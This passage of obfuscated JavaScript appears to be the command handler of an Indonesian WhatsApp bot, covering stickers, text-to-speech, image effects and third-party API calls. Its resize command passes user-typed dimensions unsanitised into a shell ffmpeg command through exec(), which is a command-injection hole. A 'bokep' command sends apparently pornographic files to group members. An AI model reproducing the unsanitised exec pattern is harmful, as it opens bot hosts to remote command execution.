            var _0x170163 = '0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄\x0a│       *「 Kartu Intro 」*\x0a│ *Nama     :* \x0a│ *Gender   :* \x0a│ *Umur      :* \x0a│ *Hobby    :* \x0a│ *Kelas      :* \x0a│ *Asal         :* \x0a│ *Agama    :* \x0a|  *Status     :* \x0a╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙\x0a';
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'text': _0x170163
            }, {
                'quoted': _0x51e31f
            });
        }
        break;
        case _0x5804c8(0x17c):
        case 'test':
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x41f), _0x1b1e88[_0x5804c8(0xd13)], _cmd), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x932571['botName'] + ' 𝙊𝙣 𝘽𝙤𝙨𝙠𝙪\x0a𝙒𝙖𝙠𝙩𝙪 𝙊𝙣𝙡𝙞𝙣𝙚 : ' + runtime(process[_0x5804c8(0x819)]())
            }, {
                'quoted': _0x51e31f
            });
            break;
        case _0x5804c8(0x47f):
        case _0x5804c8(0xc90): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x5804c8(0x7c4);
            await _0x614da8[_0x5804c8(0x593)](_0x5804c8(0x9fb), _0x1b1e88['chat']);
            let _0x522dba = await fetchJson(_0x5804c8(0x20a) + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]);
            const _0x8dfdfc = _0x522dba[_0x5804c8(0x6b2)];
            var _0x47b319 = _0x8dfdfc[_0x5804c8(0x4bd)]('--')[0x1];
            if (!_0x47b319) _0x47b319 = 'id';
            long = 'id';

            function _0x389843(_0x227fdd, _0x12d88a = 'id') {
                return new Promise((_0x11cf33, _0x435678) => {
                    const _0x606bbe = _0x2dbd;
                    try {
                        let _0x561ef7 = gtts(_0x12d88a),
                            _0x1b983c = path['join'](__dirname, _0x606bbe(0x5e7), 0x1 * new Date() + _0x606bbe(0xd23));
                        _0x561ef7[_0x606bbe(0x753)](_0x1b983c, _0x227fdd, () => {
                            const _0x427e2a = _0x606bbe;
                            _0x11cf33(fs[_0x427e2a(0x456)](_0x1b983c)), fs[_0x427e2a(0x850)](_0x1b983c);
                        });
                    } catch (_0x386c25) {
                        _0x435678(_0x386c25);
                    }
                });
            }
            let _0x50df2c;
            try {
                _0x50df2c = await _0x389843(_0x8dfdfc, long);
            } catch (_0x9fad7f) {
                _0x358f3b(_0x9fad7f + ''), _0x50df2c = await _0x389843(_0x8dfdfc);
            } finally {
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'audio': _0x50df2c,
                    'mimetype': _0x5804c8(0x8d4),
                    'ptt': !![]
                }, {
                    'quoted': _0x1b1e88
                });
            }
            limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x410):
        case _0x5804c8(0x69b):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!q) _0x358f3b(_0x5804c8(0xc98));
            let _0x4fad5b = await fetchJson('https://api.zahwazein.xyz/entertainment/simisimi?text=' + q + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0xa28)]);
            const _0x137f02 = _0x4fad5b[_0x5804c8(0x6b2)][_0x5804c8(0x200)];
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'text': _0x137f02
            }, {
                'quoted': _0x1b1e88
            });
            break;
        case 'bokep': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            const _0x4c988e = require('fs');
            if (!_0x1b1e88['isGroup']) return _0x358f3b(mess['OnlyGrup']);
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(_0x5804c8(0xa99));
            await _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x3aceee = _0x4c988e[_0x5804c8(0x456)](_0x5804c8(0x2d3)),
                _0x5f4e66 = _0x1b1e88[_0x5804c8(0x583)][0x0] || _0x1b1e88['sender'] || conn[_0x5804c8(0x1eb)](_0x83eae5[0x0]) || _0x83eae5[0x0][_0x5804c8(0xa72)](/[@.+-]/g, '')[_0x5804c8(0xa72)](' ', '') + _0x5804c8(0x7cd) || '';
            return await _0x614da8[_0x5804c8(0x51b)](_0x5f4e66, _0x3aceee, _0x5804c8(0xd18), _0x5804c8(0x75d), _0x1b1e88), _0x358f3b(_0x5804c8(0x259));
        }
        break;
        case _0x5804c8(0xb8e):
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xc3c), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            var _0x225eed = [_0x5804c8(0x5e1), _0x5804c8(0x707), _0x5804c8(0x758)],
                _0x39c4be = _0x5804c8(0xb7f);
            for (let _0x1cb2ed in translate[_0x5804c8(0xa45)]) {
                !_0x225eed[_0x5804c8(0x34b)](_0x1cb2ed) && (_0x39c4be += '*' + _0x1cb2ed + _0x5804c8(0x398) + translate[_0x5804c8(0xa45)][_0x1cb2ed] + '\x0a');
            }
            _0x358f3b(_0x39c4be);
            break;
        case _0x5804c8(0x171): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess['OnlyPrem']);
            if (!_0x8a4e1a) return _0x358f3b('Fotonya Mana?');
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(_0x5804c8(0xa8a));
            try {
                const _0x13b8b7 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                    _0x701a51 = await TelegraPH(_0x13b8b7),
                    _0x389d69 = await fetch('https://skizo.tech/api/aimirror?&apikey=' + _0x932571[_0x5804c8(0x342)] + _0x5804c8(0xa09) + _0x701a51 + _0x5804c8(0xc54) + _0x1b04cf),
                    _0x248982 = await _0x389d69['json']();
                if (_0x248982['status'] !== 0xc8) throw 'Mana gakada';
                const _0x3c0a6e = _0x248982[_0x5804c8(0xada)],
                    _0x5cb893 = _0x248982['time_processing'];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'image': {
                        'url': _0x3c0a6e
                    },
                    'caption': 'Done Bruh\x0aWaktu Selesai ' + _0x5cb893
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0xef2d56) {
                _0x358f3b(_0x5804c8(0xac0));
            }
        }
        break;
        case _0x5804c8(0x326): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(_0x5804c8(0xa8a));
            try {
                const _0x4d9d6a = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                    _0x557160 = await TelegraPH(_0x4d9d6a),
                    _0x3de3e7 = await fetch(_0x5804c8(0x1c0) + _0x932571[_0x5804c8(0x342)] + _0x5804c8(0xa09) + _0x557160 + _0x5804c8(0xc54) + _0x1b04cf),
                    _0x1f597e = await _0x3de3e7[_0x5804c8(0x3f8)]();
                if (_0x1f597e[_0x5804c8(0x670)] !== 0xc8) throw _0x5804c8(0xbb3);
                const _0x18e908 = _0x1f597e[_0x5804c8(0xada)],
                    _0x482333 = _0x1f597e[_0x5804c8(0x77d)];
                _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                    'image': {
                        'url': _0x18e908
                    },
                    'caption': _0x5804c8(0x251) + _0x482333
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x2f357d) {
                _0x358f3b(_0x5804c8(0x97e));
            }
        }
        break;
        case 'diffusion':
        case _0x5804c8(0x601):
        case _0x5804c8(0x30b): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b04cf) throw 'Masukan Promptnya\x0aExample:\x0a ' + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x5a7);
            _0x1b1e88[_0x5804c8(0x322)](mess[_0x5804c8(0x135)]);
            try {
                let _0x2ec38d = await _0x401809(_0x1b04cf),
                    _0x59278e = await _0x33c05f(_0x2ec38d, _0x5804c8(0x94a));
                _0x614da8[_0x5804c8(0x51b)](_0x1b1e88['chat'], _0x59278e, 'anu.jpg', _0x5804c8(0x48e) + _0x1b04cf, _0x1b1e88);
            } catch (_0x42aa7c) {
                _0x1b1e88['reply'](eror);
            }
        }
        break;
        case _0x5804c8(0x227): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x1b04cf) throw _0x5804c8(0x9d9);
            _0x358f3b('Proses Ayang');
            try {
                let _0x3ae7b7 = await getBuffer('https://skizo.tech/api/txt2img?text=' + _0x1b04cf + '&apikey=' + _0x932571[_0x5804c8(0x342)]);
                await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                    'image': _0x3ae7b7,
                    'caption': 'Done Sayang'
                }, {
                    'quoted': _0x1b1e88
                });
            } catch (_0x180fb3) {
                _0x358f3b(_0x5804c8(0x215));
            }
        }
        break;
        case 'aiscene': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess[_0x5804c8(0x8f0)]);
            if (!_0x8a4e1a) return _0x358f3b('Fotonya Mana?');
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(_0x5804c8(0x335));
            const _0x414438 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x28cd0a = await TelegraPH(_0x414438);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5804c8(0x9af) + _0x28cd0a + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]
                },
                'caption': _0x5804c8(0x2b8)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'toanime':
        case 'jadianime': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!_0x7b6ab6 && !_0x75f0ff) return _0x358f3b(mess['OnlyPrem']);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(_0x5804c8(0xa8a));
            const _0x22a056 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x283ad4 = await TelegraPH(_0x22a056);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5804c8(0x6f1) + _0x283ad4 + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]
                },
                'caption': _0x5804c8(0xa1a)
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x581):
        case _0x5804c8(0xad9): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x8a4e1a) return _0x358f3b('Fotonya Mana?');
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x541ead = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x15557c = await TelegraPH(_0x541ead);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5804c8(0x57f) + _0x15557c + _0x5804c8(0xcc7) + _0x932571[_0x5804c8(0x342)]
                },
                'caption': _0x5804c8(0x162)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x517): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (!q) return _0x358f3b('Masukan ukuran panjangxlebar, contoh ' + (_0x3b7c58 + _0x453fc1) + ' 300x300');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            let _0x13df78 = q[_0x5804c8(0x4bd)]('x')[0x0],
                _0x133cfb = q[_0x5804c8(0x4bd)]('x')[0x1],
                _0x17acc3 = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a),
                _0x37a28a = getRandom(_0x5804c8(0x6f5));
            exec('ffmpeg -i ' + _0x17acc3 + _0x5804c8(0x5fb) + _0x13df78 + ':' + _0x133cfb + ' ' + _0x37a28a, async _0x4d795b => {
                const _0x96c4a5 = _0x5804c8;
                fs['unlinkSync'](_0x17acc3);
                if (_0x4d795b) return _0x358f3b(_0x96c4a5(0x2fb) + _0x4d795b);
                let _0x5ec152 = fs[_0x96c4a5(0x456)](_0x37a28a);
                await _0x614da8['sendMessage'](_0x1b1e88[_0x96c4a5(0x60f)], {
                    'mimetype': _0x96c4a5(0x26e),
                    'image': _0x5ec152,
                    'caption': _0x96c4a5(0x175)
                }, {
                    'quoted': _0x51e31f
                }), fs['unlinkSync'](_0x37a28a);
            });
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x6ff): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x5e397c = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0xd780f3 = await TelegraPH(_0x5e397c);
            _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'image': {
                    'url': _0x5804c8(0x525) + _0x932571[_0x5804c8(0xc67)] + _0x5804c8(0xa09) + _0xd780f3
                },
                'caption': _0x5804c8(0xbe1)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'gay': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ ['test'](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess[_0x5804c8(0x135)]);
            const _0x58f637 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x1b5c71 = await TelegraPH(_0x58f637);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': 'https://api.zeeoneofc.my.id/api/image-effect/' + _0x453fc1 + '?apikey=' + _0x932571[_0x5804c8(0xc67)] + _0x5804c8(0xa09) + _0x1b5c71
                },
                'caption': _0x5804c8(0x61c)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x319):
        case _0x5804c8(0x561):
        case 'jail':
        case 'rip':
        case _0x5804c8(0x67b):
        case 'fire':
        case 'beautiful':
        case 'wasted': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            _0x358f3b(mess[_0x5804c8(0x135)]);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess['wait']);
            const _0x5bbee3 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a),
                _0x3ffa74 = await TelegraPH(_0x5bbee3);
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': {
                    'url': _0x5804c8(0xd78) + _0x453fc1 + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xc67)] + '&url=' + _0x3ffa74
                },
                'caption': _0x5804c8(0x94e)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x216):
        case 'hd':
        case _0x5804c8(0x911): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x570));
            if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) return _0x358f3b(_0x5804c8(0x4ee) + (_0x3b7c58 + _0x453fc1));
            _0x358f3b(mess['wait']);
            let _0x574ce0 = await _0x8a4e1a[_0x5804c8(0x4dd)](),
                _0x1c8b06 = await remini(_0x574ce0, _0x5804c8(0x94a));
            _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'image': _0x1c8b06,
                'caption': _0x5804c8(0x8a8)
            }, {
                'quoted': _0x1b1e88
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x68d):
        case _0x5804c8(0x4c5):
        case 'sponsbob':
        case 'kawan-sponsbob':
        case 'awoawo':
        case _0x5804c8(0x60f):
        case _0x5804c8(0x5cb):
        case _0x5804c8(0x419):
        case _0x5804c8(0x4e7):
        case _0x5804c8(0x316):
        case _0x5804c8(0x29b):
        case _0x5804c8(0xc92):
        case 'kr-robot':
        case 'kucing':
        case _0x5804c8(0x1a4):
        case _0x5804c8(0x8c3):
        case _0x5804c8(0xadb):
        case _0x5804c8(0x2bb):
        case 'tyni':
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            let _0x5de02d = _0x5804c8(0x655) + _0x453fc1 + _0x5804c8(0x45b) + _0x932571[_0x5804c8(0xc67)];
            _0x614da8[_0x5804c8(0x2bf)](_0x1b1e88[_0x5804c8(0x60f)], _0x5de02d, _0x1b1e88, {
                'packname': _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()),
                'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + '\x0aTime ' + _0x4fb4a6
            }), limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
            break;
        case 'qc': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x1b04cf) return _0x358f3b(_0x5804c8(0xd0d));
            let _0x5ccc74 = await await _0x614da8[_0x5804c8(0x8ca)](_0x1b1e88[_0x5804c8(0xd13)], _0x5804c8(0x63e))['catch'](_0x3fb619 => _0x5804c8(0x2e9));
            const _0x1cf916 = await quote(_0x1b04cf, _0x32b235, _0x5ccc74);
            let _0x143218 = await sticker5(_0x1cf916['result'], ![], _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()), _0x5804c8(0xd2c) + _0x932571['ownerName'] + '\x0aTime ' + _0x4fb4a6);
            if (_0x143218) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x143218, _0x5804c8(0xd85), '', _0x1b1e88);
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'stiker':
        case 'sticker':
        case 's':
        case _0x5804c8(0x635):
        case _0x5804c8(0x3c4): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed(_0x5804c8(0xd21), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            if (!_0x8a4e1a) return _0x358f3b('Balas Video/Image Dengan Caption ' + (_0x3b7c58 + _0x453fc1));
            if (/image/ ['test'](_0x2b1d7d)) {
                let _0x51d463 = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a, +new Date() * 0x1);
                await _0x614da8[_0x5804c8(0xce3)](_0x1b1e88[_0x5804c8(0x60f)], _0x51d463, _0x1b1e88, {
                    'packname': _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()),
                    'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + _0x5804c8(0x253) + _0x4fb4a6
                }), await fs[_0x5804c8(0x850)](_0x51d463);
            } else {
                if (/video/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                    if ((_0x8a4e1a[_0x5804c8(0x278)] || _0x8a4e1a)[_0x5804c8(0xbb1)] > 0xb) return _0x358f3b(_0x5804c8(0x7c7));
                    let _0x544b41 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a, +new Date() * 0x1);
                    await _0x614da8[_0x5804c8(0x869)](_0x1b1e88['chat'], _0x544b41, _0x1b1e88, {
                        'packname': _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()),
                        'author': _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + _0x5804c8(0x253) + _0x4fb4a6
                    }), await fs[_0x5804c8(0x850)](_0x544b41);
                } else {
                    if (/sticker/ ['test'](_0x2b1d7d)) {
                        let _0x1162af = await _0x614da8['downloadAndSaveMediaMessage'](_0x8a4e1a, +new Date() * 0x1);
                        await _0x614da8[_0x5804c8(0x2bf)](from, _0x1162af, _0x1b1e88, {
                            'packname': _0x5804c8(0x88c) + _0x932571['botName'] + '\x0a' + tanggal(new Date()),
                            'author': 'Owner ' + _0x932571[_0x5804c8(0x67e)] + _0x5804c8(0x253) + _0x4fb4a6
                        }), await fs['unlinkSync'](_0x1162af);
                    } else _0x358f3b(_0x5804c8(0x9b9) + (_0x3b7c58 + _0x453fc1));
                }
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'stickerwm':
        case 'swm':
        case _0x5804c8(0x588):
        case _0x5804c8(0x143):
        case 'wm': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0x9b9) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x936));
            _0x1c7aed('#stickerwm', _0x1b1e88[_0x5804c8(0xd13)], _cmd), teks1 = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] ? _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] : '', teks2 = _0x1b04cf['split']('|')[0x1] ? _0x1b04cf['split']('|')[0x1] : '', _0x358f3b(mess['wait']);
            if (/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                let _0x38c123 = await _0x8a4e1a[_0x5804c8(0x4dd)](),
                    _0x5290c1 = await sticker5(_0x38c123, ![], '' + teks1, '' + teks2);
                if (_0x5290c1) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x5290c1, _0x5804c8(0xd85), '', _0x1b1e88);
            } else {
                if (/video/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                    if ((_0x8a4e1a[_0x5804c8(0x278)] || _0x8a4e1a)['seconds'] > 0xb) return _0x358f3b(_0x5804c8(0x7c7));
                    let _0x3106e5 = await _0x8a4e1a['download'](),
                        _0x54a66b = await sticker5(_0x3106e5, ![], '' + teks1, '' + teks2);
                    if (_0x54a66b) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88['chat'], _0x54a66b, _0x5804c8(0xd85), '', _0x1b1e88);
                } else _0x358f3b(_0x5804c8(0x9b9) + (_0x3b7c58 + _0x453fc1) + ' teks1|teks2');
            }
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x337):
        case 'stickmeme':
        case _0x5804c8(0x2db):
        case _0x5804c8(0x793):
        case _0x5804c8(0x692): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed(_0x5804c8(0x24f), _0x1b1e88['sender'], _cmd);
            if (!/webp/ [_0x5804c8(0xbaa)](_0x2b1d7d) && /image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                _0x358f3b(mess[_0x5804c8(0x135)]), atas = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x0] ? _0x1b04cf['split']('|')[0x0] : '-', bawah = _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1] ? _0x1b04cf[_0x5804c8(0x4bd)]('|')[0x1] : '-', mee = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a), mem = await TelegraPh(mee);
                let _0x34cab3 = _0x5804c8(0xa4a) + encodeURIComponent(atas) + '/' + encodeURIComponent(bawah) + _0x5804c8(0x611) + mem,
                    _0x566acc = await sticker5(_0x34cab3, ![], _0x5804c8(0x88c) + _0x932571[_0x5804c8(0x4e3)] + '\x0a' + tanggal(new Date()), _0x5804c8(0xd2c) + _0x932571[_0x5804c8(0x67e)] + _0x5804c8(0x253) + _0x4fb4a6);
                if (_0x566acc) return _0x614da8[_0x5804c8(0x51b)](_0x1b1e88[_0x5804c8(0x60f)], _0x566acc, 'Quotly.webp', '', _0x1b1e88);
            } else _0x358f3b(_0x5804c8(0x4b9) + (_0x3b7c58 + _0x453fc1) + _0x5804c8(0x14f));
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case _0x5804c8(0x80d): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0xc66));
            _0x358f3b(_0x5804c8(0x335));
            let _0x295936 = await _0x614da8[_0x5804c8(0x70e)](_0x8a4e1a);
            if (/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                let _0x2fed0c = await TelegraPh(_0x295936);
                _0x358f3b(util[_0x5804c8(0xb27)](_0x2fed0c));
            } else {
                if (!/image/ [_0x5804c8(0xbaa)](_0x2b1d7d)) {
                    let _0x2ca2d2 = await UploadFileUgu(_0x295936);
                    _0x358f3b(util[_0x5804c8(0xb27)](_0x2ca2d2));
                }
            }
            await fs[_0x5804c8(0x850)](_0x295936);
        }
        break;
        case _0x5804c8(0x69d):
        case _0x5804c8(0xca7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + _0x5804c8(0xbc1));
            _0x1c7aed(_0x5804c8(0x163), _0x1b1e88['sender'], _cmd);
            if (!_0x8a4e1a) return _0x358f3b(_0x5804c8(0xc66));
